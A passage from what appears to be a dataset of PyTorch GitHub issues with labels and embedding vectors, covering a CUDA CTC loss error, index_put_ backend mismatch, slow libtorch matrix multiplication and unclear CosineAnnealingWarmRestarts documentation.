>>> target_lengths = torch.randint(low=S_min, high=S, size=(N,), dtype=torch.long)

input = input.cuda()
target = target.cuda()
input_lengths = input_lengths.cuda()
target_lengths = target_lengths.cuda()

>>> ctc_loss = nn.CTCLoss()
>>> loss = ctc_loss(input, target, input_lengths, target_lengths)
>>> loss.backward()
```

```
---------------------------------------------------------------------------
RuntimeError                              Traceback (most recent call last)
<ipython-input-10-24c5c245c677> in <module>
      1 ctc_loss = nn.CTCLoss()
      2 loss = ctc_loss(input, target, input_lengths, target_lengths)
----> 3 loss.backward()

~/anaconda3/lib/python3.7/site-packages/torch/tensor.py in backward(self, gradient, retain_graph, create_graph)
    105                 products. Defaults to ``False``.
    106         """"""
--> 107         torch.autograd.backward(self, gradient, retain_graph, create_graph)
    108 
    109     def register_hook(self, hook):

~/anaconda3/lib/python3.7/site-packages/torch/autograd/__init__.py in backward(tensors, grad_tensors, retain_graph, create_graph, grad_variables)
     91     Variable._execution_engine.run_backward(
     92         tensors, grad_tensors, retain_graph, create_graph,
---> 93         allow_unreachable=True)  # allow_unreachable flag
     94 
     95 

RuntimeError: setStorage: sizes [16, 255, 31], strides [15045, 59, 2], and storage offset 0 requiring a storage size of 240722 are out of bounds for storage with numel 240720
```

See https://gist.github.com/ypw-rich/faafe22d108c4fe24f128ecb4aaabda3

## Expected behavior

Expect same grad on CPU.

## Environment

PyTorch version: 1.1.0
Is debug build: No
CUDA used to build PyTorch: 10.0.130

OS: Ubuntu 18.04.2 LTS
GCC version: (Ubuntu 7.4.0-1ubuntu1~18.04) 7.4.0
CMake version: version 3.10.2

Python version: 3.7
Is CUDA available: Yes
CUDA runtime version: 10.0.130
GPU models and configuration: GPU 0: GeForce GTX 1080 Ti
Nvidia driver version: 418.56
cuDNN version: /data/ocr/bin/libcudnn.so.7

Versions of relevant libraries:
[pip3] numpy==1.16.2
[pip3] numpydoc==0.8.0
[pip3] torch==1.1.0
[pip3] torchvision==0.2.2.post3
[conda] blas                      1.0                         mkl
[conda] mkl                       2019.3                      199
[conda] mkl-service               1.1.2            py37he904b0f_5
[conda] mkl_fft                   1.0.10           py37ha843d7b_0
[conda] mkl_random                1.0.2            py37hd81dba3_0
[conda] torch                     1.1.0                    pypi_0    pypi
[conda] torchvision               0.2.2.post3              pypi_0    pypi
",True,"[-0.5391349  -0.15644622 -0.36089385  0.03574861 -0.3056242  -0.16794875
 -0.25180948  0.27827412 -0.39088583 -0.00120356 -0.17076208 -0.09720173
 -0.19405268  0.09258988 -0.09517252 -0.12368108 -0.1703622  -0.11127284
 -0.06439272  0.01978126  0.301978    0.0290064  -0.10966077 -0.16255632
  0.04746688  0.10551015 -0.2254732  -0.02662208  0.3229782   0.26440096
  0.01806474 -0.2804634  -0.49638534  0.227103    0.24930957 -0.14010039
 -0.40555233 -0.33201826 -0.04190898 -0.02634272  0.08377486  0.4100722
 -0.18366201  0.2437088  -0.03905381 -0.15106834 -0.09167501 -0.02679222
 -0.36389524 -0.27902007  0.19082746  0.13261557 -0.14605916 -0.06442966
  0.12350239 -0.23521225  0.15435205  0.00388044  0.11365063 -0.470282
  0.1864011  -0.00445263 -0.00695488 -0.34239376 -0.06725235 -0.08211661
 -0.29043746  0.31015682  0.69838536 -0.22624384 -0.2730315   0.11206423
  0.09472211  0.01087354 -0.07341077 -0.00889193 -0.16905433 -0.03252154
 -0.4830278  -0.16104668  0.28210402  0.21049117 -0.08787341 -0.07755233
  0.3142537   0.36639526  0.21324366 -0.07656046  0.5392704   0.14885885
  0.0359252   0.1807034   0.06334967  0.24962407  0.08395477  0.13391888
  0.2638669  -0.27687967 -0.20669168 -0.36622047 -0.08623558 -0.620401
 -0.26250276  0.3031238  -0.04918571 -0.13263533  0.03495524  0.33980924
 -0.08874112 -0.24288985  0.34220147  0.12502189  0.10300744 -0.06677484
  0.07698116 -0.17827249 -0.34808135 -0.11578736 -0.38438645  0.36611295
  0.08950616  0.09608668  0.19239992  0.05966562  0.4257951  -0.06377561
  0.18099132  0.00374845 -0.0768837  -0.12415092 -0.00786502  0.12520938
  0.3976544   0.06408902  0.4195864   0.3984877  -0.47195214  0.01118
 -0.16537073  0.04692798 -0.33327734  0.02161201 -0.15841994 -0.44352758
  0.27150667 -0.03366046 -0.23468572  0.23295516  0.26414657  0.08111142
  0.14866595  0.06317132 -0.5277561   0.34597522 -0.22233027  0.08967076
  0.2621772  -0.06932357  0.10006706 -0.5437953   0.02350244  0.1376505
  0.28316432 -0.00818424  0.18901366 -0.04020193  0.01075513 -0.08367749
 -0.32745764  0.03151259 -0.04300122 -0.18597424 -0.11261334 -0.22694294
  0.20342433 -0.00403147 -0.3157978  -0.24105093 -0.13972706  0.54498494
  0.39526403  0.6308929   0.41635478  0.07235366 -0.02084665  0.15487841
  0.44378725 -0.06322044 -0.14748567 -0.03264235 -0.23834482 -0.0754433
  0.17654273 -0.31995577 -0.35107428  0.1237619   0.17868194  0.20216528
 -0.05794809  0.07136989 -0.50127894 -0.15635066  0.23896047  0.04848043
  0.04827993  0.11515159 -0.33095133 -0.40980917 -0.2610298   0.09579161
 -0.5188217  -0.40205973 -0.15842    -0.06624784  0.17079872 -0.03893942
 -0.0428464  -0.26727104 -0.10982966 -0.14485857  0.41551042 -0.24050485
 -0.00133322 -0.04857658  0.08757692  0.22064568 -0.23964757 -0.12564033
  0.09570317 -0.15248995 -0.18473907 -0.20641972  0.12960574 -0.00189477
  0.18850547  0.6227469  -0.17834428  0.00415325 -0.16719149  0.13309926
 -0.13598065  0.06477331  0.08747943 -0.15195148  0.04928081  0.19356781
 -0.53724957 -0.13157058 -0.0983988  -0.24340121 -0.04696486 -0.08229809
 -0.19988996 -0.03770563  0.4403679   0.04235974  0.12660736 -0.08573657
 -0.35162312  0.18035486  0.39230043  0.17518432 -0.13795216  0.19099128
  0.48785558 -0.17837496 -0.0817561   0.23768048 -0.28362203  0.12469129
  0.12503092 -0.3455311   0.46048367  0.10405239  0.47011566 -0.18074255
  0.43427312 -0.10045104  0.10331909 -0.00355604  0.42488328  0.33048895
 -0.12830037  0.12579337  0.48746532 -0.25393352 -0.3739887   0.05021881
 -0.1894815  -0.37585822 -0.0939348   0.02946142  0.39508253 -0.3957476
 -0.31084532  0.11264765  0.44017398  0.00797833 -0.0236279  -0.13976565
 -0.12548195  0.10925391  0.22937652 -0.30426297 -0.19529293 -0.27665552
  0.2657664   0.01265167  0.56443477 -0.24108596  0.34838796 -0.01008121
 -0.27540678  0.37118283 -0.25382572  0.01667521  0.08909238  0.17328659
  0.2307052   0.17442863  0.17939988 -0.2617562  -0.3357659   0.03043609
 -0.0654943  -0.00303769 -0.23283243  0.19085601  0.10149905  0.31982583
  0.10984793  0.10921788  0.32129276  0.03483073 -0.11414535  0.184905
  0.13903213  0.4675059   0.04032119 -0.32428628 -0.3551671  -0.09541473
 -0.00787442 -0.05321454 -0.2675209  -0.20571947  0.20840347  0.38673902
 -0.07896508  0.04795337 -0.09061699  0.1117821  -0.07305729  0.25135267
  0.24857889  0.71495473 -0.07348788  0.1077169   0.2343446  -0.01630726
 -0.04752588  0.34872139 -0.54247975 -0.23762521 -0.06098079  0.09873461
 -0.2618706  -0.29865846  0.12215816  0.22498935 -0.24680355  0.2112897
 -0.2555334   0.06204222  0.53777665  0.03796058 -0.04906463 -0.15075772
  0.1479556  -0.11847085  0.22420841  0.2659462   0.25090805 -0.24678324]"
index_put_ no longer accepts indices with non-matching backend module: error checking triaged,"## ðŸ› Bug
in index_put_ operation indices backend now has to match source backend. It used to be not necessary, so that e.g. cuda tensor could be indexed by cpu tensor. Blame points to #17991  https://github.com/pytorch/pytorch/blob/master/aten/src/ATen/native/Indexing.cpp#L204

## To Reproduce
```
import torch

a=torch.arange(30, dtype=torch.float).view(5,6).cuda()
ind0 = torch.arange(0,a.size(0), step=2)
gO = torch.randn(a[ind0].size()).cuda()
a.index_put_((ind0,), gO, accumulate=True)
torch.cuda.synchronize()
```
used to work, now it does not. Note that forward operation with ind0 on the cpu still works (`a[ind0]`), but index_put_ breaks
## Expected behavior
Either clarification in the docs and in the code that indices tensor has to have the same backend as source tensor, or fixing the RuntimeError. In case we want to disable indexing with a different backend, it would make sense to disable it for the forward indexing operation too, right now forward would be fine, but backward will through a runtime error. 

## Environment
Pytorch 1.1 binary and recent source builds

cc @colesbury 

",True,"[-4.45342332e-01 -1.97429419e-01 -2.50618219e-01  3.81386787e-01
  2.40156621e-01 -1.80038810e-01  1.52511433e-01 -1.83395028e-01
 -4.10027444e-01 -1.38776824e-01  7.57619143e-02  1.42811779e-02
 -2.22648054e-01  7.22978413e-02 -4.18012559e-01  8.62702206e-02
 -1.92096680e-01 -1.92307010e-01  6.84612840e-02 -2.02080846e-01
 -2.94362977e-02 -1.23492405e-01 -2.27134466e-01 -1.15637511e-01
  9.21982303e-02  9.31635350e-02 -1.32843658e-01  7.45192170e-04
  1.06543362e-01 -7.20025674e-02  7.06254840e-02 -5.05187884e-02
 -6.73717022e-01  1.20687209e-01  6.57692105e-02  1.26325905e-01
 -2.49606147e-01 -8.63231495e-02 -2.74992675e-01 -2.47045428e-01
  1.27817780e-01  6.11092709e-02  1.62360102e-01 -8.94302279e-02
  1.74569413e-02 -2.04134464e-01  1.83970496e-01 -1.25349835e-01
 -1.73524559e-01 -8.95260349e-02 -1.35412991e-01  1.14056535e-01
 -2.42060021e-01 -3.62489820e-01  1.09953746e-01  5.40260561e-02
 -1.46332264e-01  1.40966371e-01  2.28690356e-01 -2.18244523e-01
  2.08480582e-01  2.66734809e-02 -1.61139607e-01 -6.07440248e-02
  1.17086470e-01 -3.30672890e-01  5.21873459e-02 -5.54805137e-02
  3.58273178e-01  9.74577665e-02  4.74433661e-01  3.64879146e-02
 -2.50227541e-01 -1.58480387e-02  5.79425022e-02  2.33630538e-01
 -1.96758419e-01  2.24228874e-01  2.34499238e-02 -1.67923033e-01
  3.64608783e-03 -4.46980037e-02  1.47788942e-01 -3.78145650e-02
  3.19564193e-02 -5.06840320e-03  1.67424217e-01 -1.19204268e-01
  5.03018916e-01  8.56023207e-02  7.01911330e-01 -2.10563272e-01
  1.83421046e-01  2.30010785e-02  2.22453564e-01 -1.33774549e-01
  2.69637764e-01  3.72605950e-01 -1.65254265e-01 -1.43515021e-01
 -1.94908068e-01 -4.97082412e-01 -3.18171740e-01  2.36265868e-01
 -8.96852762e-02  2.75652949e-03  1.08519837e-01  1.86809689e-01
  1.70744449e-01 -9.06555541e-03  1.96120083e-01  9.50334519e-02
  1.50025010e-01  1.27165392e-01 -7.02909976e-02 -2.15256542e-01
 -1.32117532e-02 -3.06565255e-01  2.15858668e-01  1.61387429e-01
 -1.27978683e-01  1.71249285e-01 -6.11075852e-03  3.59591544e-01
  2.13413134e-01  3.51920962e-01 -1.03744954e-01  6.11785352e-02
 -1.31717622e-01  8.77693221e-02  6.14160933e-02 -3.63270879e-01
  4.45939600e-04 -3.09666693e-01  1.55252084e-01  9.21784639e-02
 -5.04022121e-01 -8.15311596e-02 -3.81892920e-01  9.15711299e-02
 -1.37804866e-01 -9.72071514e-02 -1.37307823e-01 -2.17805840e-02
  2.34319612e-01  1.20656990e-01 -7.88522437e-02  1.00500599e-01
 -7.09894150e-02  7.39274397e-02 -1.20314978e-01 -8.95592272e-02
 -6.05808377e-01  3.26840341e-01 -1.05261669e-01  1.47066236e-01
  1.52012467e-01 -3.24840844e-02  3.64845127e-01 -3.79660726e-01
  3.99639845e-01  3.08692336e-01  5.80706634e-02 -3.15929726e-02
  2.43531391e-01 -9.65055265e-03 -1.70125127e-01 -3.76866572e-02
 -2.43309811e-01  2.67055601e-01 -3.08345139e-01 -7.59714618e-02
 -1.62831649e-01  5.52888215e-02  1.83721870e-01 -1.33047208e-01
  7.39515722e-02 -4.47488308e-01 -2.81853795e-01  4.57100034e-01
  2.52878159e-01  6.30536526e-02  2.64370799e-01  1.80159301e-01
  1.46004617e-01  1.75238878e-01  2.82384753e-01  6.07458465e-02
 -2.96925865e-02  5.19303493e-02 -1.34932488e-01 -1.42701268e-01
 -1.44175328e-02  4.02869508e-02  1.24912322e-01  2.40008831e-01
  9.84806940e-03 -2.79256165e-01  5.95366396e-02 -3.32315639e-03
  1.85433030e-01 -1.35876209e-01  9.44562405e-02 -4.48206328e-02
 -1.51860222e-01 -1.80407852e-01  6.40502200e-02 -4.55625057e-01
 -2.03604877e-01  1.05758622e-01 -3.02228093e-01 -3.43401551e-01
  3.51301730e-02 -2.07485139e-01 -1.64329350e-01 -1.34740509e-02
  1.35169670e-01  1.33390743e-02 -1.32449016e-01  2.52244115e-01
  2.43354470e-01 -1.76251054e-01  7.62963966e-02 -1.32915691e-01
 -8.77337605e-02 -2.68764377e-01 -2.63258100e-01 -3.39119174e-02
 -1.84145749e-01  1.13643538e-02 -7.36864135e-02 -3.91221911e-01
  4.61327970e-01  1.03271201e-01  2.46302858e-01  1.53941959e-01
  6.81452602e-02 -2.20029563e-01  3.73668484e-02  3.54531854e-01
 -4.41257477e-01  1.18266135e-01  3.57587077e-03 -2.16435865e-01
 -2.15429991e-01  2.01165468e-01 -7.36921951e-02  1.76048398e-01
 -3.51771176e-01 -1.48074284e-01  1.79418981e-01 -1.14854753e-01
 -6.68829381e-02 -2.71621943e-02  7.98047781e-02 -8.27691257e-02
 -2.65893303e-02  1.90816954e-01 -1.27207160e-01 -1.91218220e-02
  2.75962532e-01  6.87108636e-02  7.28044808e-02  3.83061945e-01
  4.37928922e-03  2.24911094e-01 -1.73136637e-01  4.02227134e-01
 -3.00259888e-02  1.99390620e-01 -7.12168738e-02  6.75723553e-02
  4.63683307e-01 -1.07550301e-01 -7.46181607e-02 -8.56546685e-04
  4.66972619e-01 -2.87987143e-01 -1.14745237e-01  3.68762836e-02
  3.20219159e-01  3.53310108e-01 -3.30677629e-01  4.12207544e-01
  1.95676997e-01 -2.96210319e-01 -8.12527388e-02 -9.47062895e-02
 -3.30634750e-02 -1.67009220e-01 -3.45926791e-01 -1.37660369e-01
  1.45757198e-01 -3.50667298e-01 -1.43942788e-01 -7.28815570e-02
  2.00410128e-01 -5.25932275e-02 -4.35154103e-02  2.37312973e-01
  1.62739217e-01  3.06997001e-01  3.02868843e-01 -8.24879110e-02
 -2.58211493e-01  1.76737756e-01  2.29604363e-01 -2.48448141e-02
  4.43899840e-01 -2.92402387e-01  1.49745226e-01  1.14734665e-01
 -1.32056311e-01  2.18360841e-01  7.87135512e-02  1.15125380e-01
 -2.96880789e-02  6.80102780e-02  2.31787682e-01  4.60260212e-02
 -1.02339610e-01 -4.36074078e-01 -2.68533289e-01  1.59459472e-01
  9.56330597e-02  1.06900230e-01 -9.84405652e-02  9.90691483e-02
  2.18154863e-02  1.26632541e-01 -8.32996070e-02 -9.56929177e-02
 -1.27019122e-01  1.88978121e-01  1.63927227e-02 -3.53743434e-01
 -5.63689135e-02  1.10641554e-01 -2.11135894e-02 -2.02141792e-01
 -2.15317458e-01  4.64421436e-02  1.42662048e-01 -4.98797856e-02
 -2.15653479e-01 -1.35666162e-01  7.97442049e-02  5.13748601e-02
 -6.81435019e-02  4.12236273e-01  5.58213741e-02 -1.21770194e-02
 -5.78251220e-02  3.73249650e-01  5.30160852e-02  4.42876816e-01
  3.47581208e-01  1.80622697e-01 -2.45415866e-01  1.83276951e-01
  4.17245738e-02 -2.06451342e-02 -1.65556267e-01 -5.58650568e-02
 -1.88776478e-02 -1.32635711e-02 -5.58024570e-02 -7.99172521e-02
  5.50135493e-01 -2.28161626e-02 -4.66136113e-02 -1.13971055e-01
 -2.33937949e-01  1.07224379e-02  4.06116247e-01 -4.73825485e-01
 -3.20889577e-02 -9.11260396e-02  1.37514919e-01  5.75372577e-02
  3.46268624e-01  1.71807200e-01  9.71063673e-02 -1.22197129e-01]"
libtorch does not initialize OpenMP/MKL by default high priority module: docs module: cpp triaged module: multithreading,"I find that matrix multiplication is slower in C++ API, so I write the same code in C++ and python and record their execution times, code is as following:

**C++:**
```
#include<torch/torch.h>
#include<iostream>
#include <chrono>

int main(){
	torch::Tensor tensor = torch::randn({2708, 1433});
	torch::Tensor weight = torch::randn({1433, 16});
	auto start = std::chrono::high_resolution_clock::now();
	tensor.mm(weight);
	auto end = std::chrono::high_resolution_clock::now();
	std::cout<< ""C++ Operation Time(s) "" << std::chrono::duration<double>(end - start).count() << ""s"" << 	std::endl;
	return 0;
}
```

**Result**:
```
C++ Operation Time(s) 0.082496s
```

**python:**
```
import torch
import torch.nn as nn
import torch.nn.functional as F

tensor = torch.randn(2708, 1433)
weight = torch.randn(1433, 16)
t0 = time.time()
tensor.mm(weight)
t1 = time.time()
print(""Python Operation Time(s) {:.4f}"".format(t1 - t0))
```

**Result**:
```
Python Operation Time(s) 0.0114
```

**Testing Environment:**
```
ubuntu 16.04
gcc version 5.4.0
python version 3.7.3
pytorch version 1.0.1
```

It's not a small difference, why is it happen???
",True,"[-4.55579072e-01 -1.99242964e-01 -5.10877967e-01  2.04570621e-01
  7.92514384e-02 -1.68824315e-01 -4.01666999e-01  2.56116509e-01
 -3.39934707e-01 -2.77625285e-02 -6.85518384e-02 -1.32495701e-01
 -3.45251225e-02  2.72840977e-01 -4.73417230e-02  1.02763670e-02
 -1.39863402e-01 -4.13846552e-01  6.89379945e-02 -5.97601682e-02
  2.62617469e-01  6.05350137e-02 -1.25229985e-01  1.64820999e-02
  2.96641648e-01  1.18503049e-01 -1.65613502e-01 -3.73987854e-01
  1.11431517e-01  2.24688277e-01  1.84019610e-01 -1.45772681e-01
  9.33917090e-02 -4.81674913e-03  2.20203638e-01  3.43434274e-01
  5.48816808e-02 -1.11778237e-01 -1.80839926e-01  1.20652840e-03
  1.52466744e-01  2.30471477e-01 -1.10923536e-02  1.46995485e-01
 -1.12713270e-01 -9.69798490e-02 -1.12244114e-01  1.75810128e-01
 -1.25537261e-01  2.65122224e-02 -1.31797507e-01  1.40344456e-01
 -3.23634207e-01 -1.75476104e-01  1.10662133e-01 -3.39914680e-01
 -2.49774575e-01 -4.61852998e-02  1.07588254e-01 -1.53742552e-01
 -5.80563433e-02 -6.81630373e-02 -9.40992087e-02  1.04337536e-01
  1.36417896e-01  2.40607262e-01  1.34470105e-01  8.22088197e-02
  2.60392696e-01 -1.89681947e-01 -3.01748157e-01  5.65115064e-02
 -8.98785144e-02 -1.79307908e-01 -1.69266984e-02  9.93953049e-02
 -2.11567819e-01  2.18291163e-01 -4.56826389e-02 -2.96614826e-01
  1.96954831e-02  8.32808018e-02  1.86750114e-01  2.55608857e-02
  4.90896329e-02  1.99575856e-01  3.48451823e-01  1.89514235e-01
  5.18548965e-01 -1.27008528e-01  1.46352395e-01  1.48186505e-01
 -2.81480432e-01  5.26555419e-01  1.35706291e-01  1.57965329e-02
  6.13692701e-02 -3.85934412e-02 -3.72607112e-01 -1.39236674e-01
 -4.34126556e-02 -2.52466291e-01 -3.67945910e-01  1.04164034e-01
  1.99722528e-01 -1.68353066e-01  1.23203829e-01  9.73380581e-02
 -2.10979924e-01 -1.63202640e-02  4.49525982e-01  2.75168121e-01
 -9.35085118e-02 -4.45949495e-01  1.58716708e-01  3.29784870e-01
 -1.52794644e-04 -6.56932890e-02 -1.05538815e-02  4.07283068e-01
  1.73505619e-02  1.40193962e-02 -2.34987706e-01  2.75719821e-01
  2.76981652e-01  2.75834441e-01  1.79927602e-01  5.04392982e-02
 -1.83466002e-02 -1.98623657e-01  1.52450472e-01  1.03527933e-01
 -1.78553700e-01  1.12679109e-01  6.41057372e-01  3.41171890e-01
 -3.58638436e-01 -1.64095968e-01 -6.16778620e-02 -3.94332781e-03
  8.18009526e-02  2.61732996e-01 -1.81302458e-01 -4.58295584e-01
  1.74082160e-01  3.62114429e-01 -2.48658415e-02 -1.51114613e-02
 -1.45620823e-01  2.01469347e-01 -1.02713920e-01 -1.94027469e-01
 -2.23978944e-02  2.34301478e-01  1.06914759e-01 -1.58186834e-02
  2.08298936e-01 -3.61438096e-02  1.26516342e-01 -2.69934803e-01
 -2.38997519e-01  4.20765221e-01 -5.93086854e-02  2.51452714e-01
  1.44998550e-01  1.44658564e-02 -2.87643760e-01 -3.54734063e-01
 -3.64410609e-01  2.98815429e-01 -2.61133492e-01 -2.67545611e-01
 -1.11994997e-01 -1.94656700e-01  6.15109801e-02 -1.27432674e-01
 -3.76679599e-02 -4.30065185e-01  6.79248646e-02  1.76632285e-01
  7.37771243e-02  5.18381953e-01  1.86755091e-01 -2.48799529e-02
 -2.07797974e-01  5.81914335e-02  1.76551253e-01  3.00360136e-02
 -4.88850772e-02 -8.22636038e-02 -3.79326463e-01 -1.72210801e-02
  1.75820440e-01 -5.06534688e-02 -1.50121421e-01 -4.84580323e-02
  2.51076788e-01  4.01528358e-01  1.21295631e-01  1.09023720e-01
 -6.69820607e-02  1.26327246e-01  2.10970014e-01  2.20142290e-01
  3.17751527e-01  1.10968828e-01 -4.58851457e-01 -1.32073924e-01
 -4.87979129e-02  2.10655272e-01 -2.40160599e-01  2.01916043e-02
 -9.02770609e-02 -2.11047649e-01 -2.94909269e-01  4.94606644e-01
 -2.45788857e-01 -1.75464362e-01 -1.06684715e-01  1.20934859e-01
  5.15596986e-01 -5.26215062e-02  3.26862372e-03 -2.39554942e-01
  3.76556754e-01 -3.33201170e-01 -1.37225896e-01 -1.70543700e-01
 -4.97279018e-02  5.77819981e-02 -2.35623538e-01 -2.69718558e-01
  6.73111379e-02  8.43234807e-02  4.88303304e-02  7.31367990e-02
  9.25911367e-02  2.49364171e-02  1.99537024e-01  5.50040416e-02
 -2.43227839e-01 -2.83469915e-01  2.43728355e-01  1.66896749e-02
  8.34832154e-03  1.80469364e-01 -7.95016810e-02 -3.71461250e-02
 -1.30273461e-01 -7.40961730e-02 -1.89278528e-01  1.21724404e-01
  2.37205148e-01 -1.98291361e-01  1.12793706e-02  2.83758566e-02
 -8.48788321e-02 -1.08710468e-01 -1.08393267e-01 -1.28064528e-01
 -1.10425308e-01  2.84430504e-01  3.43757048e-02  3.06609124e-01
  2.32730567e-01 -6.65790886e-02 -1.00060366e-01  2.44269401e-01
 -5.32964468e-02 -2.78809994e-01  1.82890624e-01 -2.49876752e-01
  1.10310882e-01  5.56427315e-02 -5.49554601e-02 -2.51239836e-01
  1.44620806e-01 -3.12166095e-01  9.89181995e-02  1.57527834e-01
 -8.39506555e-03  1.48108661e-01 -3.84429842e-02  1.57057241e-01
  2.85195231e-01 -3.59322906e-01 -2.27110416e-01 -1.18502319e-01
 -2.89475560e-01 -7.90289119e-02 -1.45944551e-01  1.74450874e-03
  1.93679303e-01  8.92548785e-02 -1.02326293e-02  4.28707600e-01
  2.94170380e-02 -1.99096262e-01  9.13381428e-02 -2.36595236e-02
  2.11297944e-01  2.46882737e-02 -1.40020251e-01  1.13774955e-01
 -3.62892866e-01 -1.70167424e-02  1.00098833e-01  3.04779142e-01
  2.85441786e-01 -2.55650878e-01  5.58697462e-01  1.34630024e-01
 -2.49341398e-01  3.57583046e-01 -2.63334274e-01  5.01426049e-02
 -1.42724678e-01  3.30330193e-01  4.59523313e-02  1.31689012e-01
 -3.19170415e-01 -2.59468198e-01 -5.24016380e-01  2.42308736e-01
 -9.85497832e-02  1.52923450e-01 -3.41973782e-01 -5.10395095e-02
 -1.92205384e-01  1.16571628e-01  2.94631422e-01 -1.43960714e-01
  1.78739518e-01 -7.56925717e-02 -3.08116496e-01 -2.03611821e-01
 -1.27365559e-01  1.00226484e-01 -8.11498314e-02 -2.52609551e-01
  1.15332246e-01 -1.83297411e-01  1.15355544e-01 -3.15531194e-01
 -1.13312721e-01 -2.51409829e-01  2.94431925e-01  4.36068267e-01
 -7.01036006e-02 -3.64409611e-02 -7.82870799e-02  1.35832354e-01
 -1.08417049e-01 -5.18382043e-02 -2.39312183e-02  3.80024076e-01
  3.19972932e-01  3.52490544e-02 -9.03413147e-02  3.34161162e-01
 -5.57540134e-02  1.14776626e-01 -1.61892772e-01 -1.16069622e-01
 -1.39235258e-01 -2.59635627e-01 -1.51669487e-01 -1.42592907e-01
  8.09424520e-02  2.27368280e-01 -1.59975797e-01  1.62355661e-01
 -9.39759985e-03  2.97456980e-01  3.69092971e-01  1.52267516e-02
 -5.10500334e-02 -1.50020987e-01  1.97806228e-02  2.82279760e-01
  3.97826880e-02 -9.26517695e-02 -1.98408335e-01  4.64001372e-02]"
CosineAnnealingWarmRestarts documentation poor and not appearing module: docs triaged,"## ðŸ“š Documentation

The documentation for the newly introduced `CosineAnnealingWarmRestarts` learning rate scheduler (#17226) does not appear on the website (see [here](https://pytorch.org/docs/stable/optim.html); the location where it should be).

Furthermore, looking at the [source code of the function](https://github.com/pytorch/pytorch/blob/master/torch/optim/lr_scheduler.py#L699), I am very confused about how to use the scheduler.

Specifically, if we look at the documentation of `.step()`, we first see a clear typo, where `CosineAnnealingWarmRestarts` is called `SGDR`. But the provided example is not sufficient to use as a reference. Where did the value 26 come from and why, and what does it have to do with 10 iterations? Also, [the paper](https://arxiv.org/abs/1608.03983) on which this scheduler is based states that the LR should be updated every _batch_, not epoch. I believe the statement in the documentation `SGDR.step(0.1), SGDR.step(0.2)` is referring to this, but I am lost in the example.

If I try to ignore the docstring and look at the source code, my best guess is that the correct message for the docstring in `.step` should be something like:

```python
""""""Step should be called after every time a batch is processed in addition to after each epoch,
   like in the following example:

         >>> scheduler = CosineAnnealingWarmRestarts(optimizer, T_0, T_mult)
         >>> for epoch in range(N):
         >>>     scheduler.step(epoch)
         >>>     for inputs, labels in trainloader:
         >>>         optimizer.zero_grad()
         >>>         outputs = net(inputs)
         >>>         loss = criterion(outputs, labels)
         >>>         loss.backward()
         >>>         optimizer.step()
         >>>         scheduler.step()
""""""
```

Is this correct? Or have I misinterpreted how to apply this function?

Thanks for the great work and please let me know if I can help in some way.",True,"[-1.57938093e-01 -9.28382277e-02 -2.75306016e-01  2.02413313e-02
 -3.44927050e-02 -5.91659471e-02 -1.90672889e-01 -7.80244097e-02
 -9.61547047e-02  3.58318351e-03  7.50431269e-02  1.02959871e-01
  9.11890566e-02  2.01375306e-01 -2.19167918e-01 -2.50535905e-01
  1.85691923e-01 -1.90759286e-01  4.96499985e-03 -2.25099728e-01
 -1.48791492e-01  3.07365626e-01 -5.24085984e-02  2.38489509e-01
  4.65110421e-01  1.64272059e-02 -3.02912593e-01 -2.51678050e-01
  1.10483028e-01  2.28853673e-01  1.60520807e-01  1.48378924e-01
  3.50538790e-02 -2.73773342e-01  4.82965000e-02  1.52351618e-01
  1.35983318e-01 -1.78075153e-02 -7.12094828e-04  1.02005348e-01
 -1.83596671e-01  6.61400035e-02 -2.62220323e-01  2.85798073e-01
 -1.33414090e-01 -1.43460125e-01 -1.30945608e-01  1.40089810e-01
 -4.27138448e-01  7.80236423e-02 -2.30101854e-01 -8.11901689e-02
 -1.74525768e-01 -1.27909392e-01 -1.13122880e-01 -1.26567194e-02
 -8.62248167e-02  3.39067400e-01 -7.86778927e-02 -1.88345894e-01
  8.59017894e-02 -8.47979188e-02 -1.20450690e-01  2.19138607e-01
 -1.41842008e-01  3.25957447e-01 -4.55472246e-02  1.02654016e-02
  4.06995416e-01 -1.36141554e-01 -1.72057062e-01 -1.49226338e-01
  8.82357135e-02 -1.60441905e-01  3.54496539e-02  4.54696566e-02
 -1.55044496e-01  1.81081891e-01  1.16308004e-01 -3.89782965e-01
  2.94405334e-02  1.03361540e-01  2.15382516e-01  1.56161577e-01
  1.79039657e-01 -8.82071778e-02  1.68562233e-01  1.08995341e-01
  2.70394981e-01 -7.25847930e-02  4.03467655e-01 -5.76802678e-02
 -2.57752705e-02 -5.41826263e-02 -9.40582752e-02  3.17231268e-01
 -3.09034109e-01  1.60064891e-01 -4.69583161e-02 -1.79266632e-01
 -2.27659285e-01 -2.57473975e-01 -5.36853224e-02  3.77576709e-01
 -2.00167716e-01 -4.43731964e-01  2.81278372e-01  1.72407448e-01
  2.49797806e-01 -6.89428300e-04 -1.35300040e-01 -2.95527913e-02
 -6.79520369e-02  4.59408537e-02  1.86622515e-01  3.14317107e-01
 -1.48252463e-02 -5.83274327e-02  1.62819207e-01  4.82810527e-01
  2.38026381e-02  1.58041090e-01 -1.05750719e-02 -8.34963173e-02
  5.86304739e-02  1.57902330e-01  7.48794675e-02  6.52380381e-03
  4.57070582e-02  3.11260968e-02 -6.98776543e-02 -6.48855269e-02
  1.34274038e-02 -2.28760801e-02  7.92604685e-02  4.68829758e-02
  9.56502110e-02 -2.02070385e-01  7.32665434e-02 -1.26861617e-01
 -2.23622143e-01  1.97047487e-01 -1.03718527e-01 -2.48017460e-01
  9.43669528e-02  2.49680847e-01 -1.16856813e-01  2.95501322e-01
  9.36338082e-02 -6.21834174e-02 -1.33339390e-01  5.87060079e-02
 -1.01017669e-01  5.63956738e-01  1.49043009e-01  1.50950819e-01
 -2.92765163e-02 -4.28707525e-02  7.04662595e-03 -2.92706311e-01
 -1.99864686e-01  2.12223500e-01  7.73323327e-02  7.02043176e-02
  3.58555317e-02  1.05621547e-01 -2.29047656e-01 -3.07292879e-01
 -7.68796802e-02 -2.36492492e-02  5.99874705e-02 -9.67336595e-02
  2.32755780e-01  6.74035028e-02  1.16541006e-01 -4.75866720e-02
  1.44847393e-01 -1.22293308e-01  1.32094011e-01  1.78753719e-01
 -6.05526455e-02  2.45121270e-01  9.49234068e-02  1.53635412e-01
 -1.91913843e-01  1.83946162e-01  6.94416761e-02 -2.16860883e-02
 -1.30472019e-01  5.50543964e-02 -5.34701608e-02 -4.09303874e-01
 -1.80353001e-02 -6.10157736e-02 -8.72490034e-02 -1.59929972e-02
  1.67439222e-01 -1.99373178e-02 -7.18528330e-02  2.27591723e-01
 -1.50548875e-01  2.79931843e-01  3.61858726e-01 -5.39617725e-02
